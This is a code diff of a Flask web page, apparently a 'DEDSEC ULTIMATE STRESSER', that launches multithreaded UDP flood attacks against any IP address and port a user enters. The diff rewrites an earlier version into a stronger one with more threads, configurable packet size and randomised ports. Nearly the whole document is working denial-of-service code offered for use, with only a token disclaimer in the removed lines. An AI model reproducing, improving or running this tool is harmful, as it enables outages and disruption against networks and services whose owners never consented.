@@ -1,74 +1,105 @@
 from flask import Blueprint, request
 import socket
-import threading
 import random
+import threading
 import time
+from datetime import datetime
 
 script4_bp = Blueprint('script4', __name__)
 
-# Attack Status Settings
-stop_attack = False
-logs = []
+# Global variable to control the attack
+attack_running = False
+log_messages = []
 
-def attack_logic(ip, port, duration):
-    global stop_attack, logs
-    # Random bytes for the payload (1024 bytes)
-    bytes_payload = random._urllib_bytes(1024)
+def udp_flood(ip, port, duration, size):
+    global attack_running
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes_payload = random._urandom(size)
     timeout = time.time() + duration
     sent = 0
-
-    while time.time() < timeout:
-        if stop_attack:
-            break
+    
+    while time.time() < timeout and attack_running:
         try:
-            # Creating a raw socket
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP Flood
-            addr = (str(ip), int(port))
-            s.sendto(bytes_payload, addr)
+            # Randomizing port if 0 is selected
+            target_port = port if port != 0 else random.randint(1, 65535)
+            client.sendto(bytes_payload, (ip, target_port))
             sent += 1
         except Exception as e:
-            pass
-    
-    logs.append(f"🏁 Attack Finished. Sent {sent} packets to {ip}:{port}")
+            break
+    client.close()
 
 @script4_bp.route("/", methods=["GET", "POST"])
 def index():
-    global stop_attack, logs
-    
-    if request.method == "POST":
-        target_ip = request.form.get("ip")
-        target_port = request.form.get("port", 80)
-        duration = int(request.form.get("duration", 30))
-        threads = int(request.form.get("threads", 5))
+    global attack_running, log_messages
+    status_msg = ""
 
-        stop_attack = False
-        logs = [f"🔥 Launching Advanced UDP Flood on {target_ip}:{target_port}..."]
+    if request.method == "POST":
+        action = request.form.get("action")
         
-        # Multithreading for maximum impact
-        for i in range(threads):
-            t = threading.Thread(target=attack_logic, args=(target_ip, target_port, duration))
-            t.start()
-        
-        return "🔥 Attack Initiated! Check logs below."
+        if action == "START":
+            target_ip = request.form.get("ip")
+            target_port = int(request.form.get("port", 80))
+            threads = int(request.form.get("threads", 10))
+            duration = int(request.form.get("duration", 60))
+            packet_size = int(request.form.get("size", 1024))
+
+            if target_ip:
+                attack_running = True
+                log_messages = [f"[*] Flood started on {target_ip}:{target_port} at {datetime.now().strftime('%H:%M:%S')}"]
+                
+                # Launching Multiple Threads for Power
+                for _ in range(threads):
+                    thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration, packet_size))
+                    thread.daemon = True
+                    thread.start()
+                
+                status_msg = f"🚀 Attack Launched on {target_ip}!"
+            else:
+                status_msg = "❌ Error: Target IP missing!"
+
+        elif action == "STOP":
+            attack_running = False
+            status_msg = "🛑 Attack Terminated."
 
     return f"""
-    <div style="font-family: 'Courier New', monospace; padding: 20px; background: #000; color: #00ff00; height: 100vh;">
-        <h2 style="color: #ff0000; text-decoration: underline;">⚡ ADVANCED DDoS STRESSER v3.0 ⚡</h2>
-        <p style="color: #ffff00;">[WARNING] For Authorized Testing Only. Use of this tool for illegal activities is strictly prohibited.</p>
+    <div style="background:#000; color:#ff3e3e; font-family:'Courier New', monospace; padding:20px; min-height:100vh; border: 3px solid #ff3e3e;">
+        <h1 style="text-align:center; color:#fff; text-shadow: 0 0 10px #ff3e3e;">🔥 FL00D 3.0 - DEDSEC ULTIMATE STRESSER 🔥</h1>
+        <p style="text-align:center; color:#888;">#T4ke_7hem_d0wn | #AndroSec1337 | #CyberMasterPro</p>
         
-        <form method="POST" style="border: 1px solid #00ff00; padding: 20px; display: inline-block;">
-            IP Address: <input name="ip" placeholder="192.168.1.1" style="background: #222; color: #0f0; border: 1px solid #0f0;" required><br><br>
-            Port: <input name="port" type="number" value="80" style="background: #222; color: #0f0; border: 1px solid #0f0;"><br><br>
-            Duration (sec): <input name="duration" type="number" value="30" style="background: #222; color: #0f0; border: 1px solid #0f0;"><br><br>
-            Threads: <input name="threads" type="number" value="10" max="100" style="background: #222; color: #0f0; border: 1px solid #0f0;"><br><br>
-            <button type="submit" style="background: #ff0000; color: white; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold;">START FLOOD</button>
+        <form method="POST" style="background:#111; padding:20px; border:1px solid #333; border-radius:10px; max-width:600px; margin:auto;">
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
+                <label>Target IP:</label>
+                <input name="ip" placeholder="127.0.0.1" style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
+                
+                <label>Port (0=Mixed):</label>
+                <input name="port" type="number" value="80" style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
+                
+                <label>Threads (Power):</label>
+                <input name="threads" type="number" value="50" max="200" style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
+                
+                <label>Packet Size (Bytes):</label>
+                <input name="size" type="number" value="1250" style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
+                
+                <label>Duration (Sec):</label>
+                <input name="duration" type="number" value="60" style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
+            </div>
+            <br>
+            <div style="text-align:center;">
+                <button name="action" value="START" style="background:#ff3e3e; color:#fff; border:none; padding:10px 30px; cursor:pointer; font-weight:bold;">EXECUTE ATTACK</button>
+                <button name="action" value="STOP" style="background:#fff; color:#000; border:none; padding:10px 30px; cursor:pointer; font-weight:bold; margin-left:10px;">STOP</button>
+            </div>
         </form>
-        
-        <div style="margin-top:20px; background: #111; padding: 15px; border: 1px dashed #00ff00;">
-            <pre>{chr(10).join(logs) if logs else "Awaiting Target Data..."}</pre>
+
+        <div style="margin-top:20px; background:#050505; border:1px solid #333; padding:15px; height:150px; overflow-y:auto; font-size:12px;">
+            <b style="color:#fff;">[ SYSTEM LOGS ]</b><br>
+            {status_msg}<br>
+            {"<br>".join(log_messages)}
+            {f"<br><span style='color:yellow;'>[!] Flooding in progress... Sending heavy UDP packets...</span>" if attack_running else ""}
         </div>
+        
         <br>
-        <a href="/" style="color: #3498db; text-decoration: none;">⬅️ EXIT TO DASHBOARD</a>
+        <div style="text-align:center;">
+            <a href="/" style="color:#ff3e3e; text-decoration:none;">[ RETURN TO MAIN DASHBOARD ]</a>
+        </div>
     </div>
     """
-
